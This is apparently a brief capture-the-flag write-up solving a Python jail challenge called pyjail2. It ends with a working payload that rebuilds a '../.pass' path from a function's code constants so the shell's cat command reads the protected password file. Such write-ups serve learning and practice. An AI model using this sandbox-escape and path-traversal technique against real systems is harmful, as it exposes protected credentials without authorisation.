print dir() shows all available classes

print dir(shell) will get you started

the shell class has four available commands:
cat  : will be useful later
help : print out the aim of the challenge
hint : Give you a link to python documentation
ls   : same as the linux command

the help command give us the path we need:
help:
  This script run as pyjail2.
  Find a way to print this file /home/pyjail2/.pass

Unfortunatly it's printed from inside a function so we can't assign is to a variable.

We can however find the source of the text here:
shell.help.im_func.func_code.co_consts

The cat command uses relative paths starting at /home/pyjail2/docs/ so we can't use the path as is.
We need to make it ../.pass

Which gives us:
print shell.cat(shell.help.im_func.func_code.co_consts[3][46:47]+shell.help.im_func.func_code.co_consts[3][46:47]+shell.help.im_func.func_code.co_consts[3][45:46]+shell.help.im_func.func_code.co_consts[3][46:51])
